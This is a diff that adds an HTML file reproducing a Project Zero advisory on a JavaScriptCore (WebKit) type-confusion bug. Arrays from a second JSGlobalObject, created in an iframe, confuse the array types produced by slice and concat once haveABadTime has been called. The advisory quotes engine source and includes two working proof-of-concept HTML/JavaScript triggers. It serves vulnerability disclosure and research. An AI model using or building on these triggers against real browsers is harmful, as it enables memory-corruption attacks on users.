@@ -1,0 +1,123 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1208
+
+After JSGlobalObject::haveABadTime is called, the type of all JavaScript arrays(including newly created arrays) are of the same type: ArrayWithSlowPutArrayStorage. But (of course) this only affects objects that share the same JSGlobalObject. So arrays come from another JSGlobalObject can cause type confusions.
+
+void JSGlobalObject::haveABadTime(VM& vm)
+{
+	...
+    for (unsigned i = 0; i < NumberOfIndexingShapes; ++i)
+        m_arrayStructureForIndexingShapeDuringAllocation[i].set(vm, this, originalArrayStructureForIndexingType(ArrayWithSlowPutArrayStorage));  <<-- The type of a newly created array will be ArrayWithSlowPutArrayStorage
+    ...
+    while (!foundObjects.isEmpty()) {
+        JSObject* object = asObject(foundObjects.last());
+        foundObjects.removeLast();
+        ASSERT(hasBrokenIndexing(object));
+        object->switchToSlowPutArrayStorage(vm); <<------ switch type of an old array
+    }
+}
+
+
+1. fastSlice:
+JSArray* JSArray::fastSlice(ExecState& exec, unsigned startIndex, unsigned count)
+{
+    auto arrayType = indexingType();
+    switch (arrayType) {
+    case ArrayWithDouble:
+    case ArrayWithInt32:
+    case ArrayWithContiguous: {
+        VM& vm = exec.vm();
+        if (count >= MIN_SPARSE_ARRAY_INDEX || structure(vm)->holesMustForwardToPrototype(vm))
+            return nullptr;
+
+        Structure* resultStructure = exec.lexicalGlobalObject()->arrayStructureForIndexingTypeDuringAllocation(arrayType);
+        JSArray* resultArray = JSArray::tryCreateForInitializationPrivate(vm, resultStructure, count);
+        if (!resultArray)
+            return nullptr;
+
+        auto& resultButterfly = *resultArray->butterfly();
+        if (arrayType == ArrayWithDouble)
+            memcpy(resultButterfly.contiguousDouble().data(), m_butterfly.get()->contiguousDouble().data() + startIndex, sizeof(JSValue) * count);
+        else
+            memcpy(resultButterfly.contiguous().data(), m_butterfly.get()->contiguous().data() + startIndex, sizeof(JSValue) * count);
+        resultButterfly.setPublicLength(count);
+
+        return resultArray;
+    }
+    default:
+        return nullptr;
+    }
+}
+
+If |this| came from another JSGlobalObject, and |haveABadTime| was called, the type of |resultArray| will be ArrayWithSlowPutArrayStorage. It will result in a type confusion.
+
+<html>
+<body>
+<script>
+
+Array.prototype.__defineGetter__(100, () => 1);
+
+let f = document.body.appendChild(document.createElement('iframe'));
+let a = new f.contentWindow.Array(2.3023e-320, 2.3023e-320, 2.3023e-320, 2.3023e-320, 2.3023e-320, 2.3023e-320);
+
+let c = Array.prototype.slice.call(a);
+alert(c);
+
+</script>
+</body>
+</html>
+
+2. arrayProtoPrivateFuncConcatMemcpy
+EncodedJSValue JSC_HOST_CALL arrayProtoPrivateFuncConcatMemcpy(ExecState* exec)
+{
+...
+    JSArray* firstArray = jsCast<JSArray*>(exec->uncheckedArgument(0));
+    ...
+    IndexingType type = firstArray->mergeIndexingTypeForCopying(secondType);
+    ...
+    Structure* resultStructure = exec->lexicalGlobalObject()->arrayStructureForIndexingTypeDuringAllocation(type);
+    JSArray* result = JSArray::tryCreateForInitializationPrivate(vm, resultStructure, firstArraySize + secondArraySize);
+    if (!result)
+        return JSValue::encode(throwOutOfMemoryError(exec, scope));
+    
+    if (type == ArrayWithDouble) {
+        double* buffer = result->butterfly()->contiguousDouble().data();
+        memcpy(buffer, firstButterfly->contiguousDouble().data(), sizeof(JSValue) * firstArraySize);
+        memcpy(buffer + firstArraySize, secondButterfly->contiguousDouble().data(), sizeof(JSValue) * secondArraySize);
+    } else if (type != ArrayWithUndecided) {
+        WriteBarrier<Unknown>* buffer = result->butterfly()->contiguous().data();
+        memcpy(buffer, firstButterfly->contiguous().data(), sizeof(JSValue) * firstArraySize);
+        if (secondType != ArrayWithUndecided)
+            memcpy(buffer + firstArraySize, secondButterfly->contiguous().data(), sizeof(JSValue) * secondArraySize);
+        else {
+            for (unsigned i = secondArraySize; i--;)
+                buffer[i + firstArraySize].clear();
+        }
+    }
+
+    result->butterfly()->setPublicLength(firstArraySize + secondArraySize);
+    return JSValue::encode(result);
+}
+
+If |firstArray| came from another JSGlobalObject, and |haveABadTime| was called, the type of |result| will be ArrayWithSlowPutArrayStorage. It will result in a type confusion.
+
+PoC:
+-->
+
+<html>
+<body>
+<script>
+
+Array.prototype.__defineGetter__(100, () => 1);
+
+let f = document.body.appendChild(document.createElement('iframe'));
+let a = new f.contentWindow.Array(2.3023e-320, 2.3023e-320);
+let b = new f.contentWindow.Array(2.3023e-320, 2.3023e-320);
+
+let c = Array.prototype.concat.call(a, b);
+
+alert(c);
+
+</script>
+</body>
+</html>
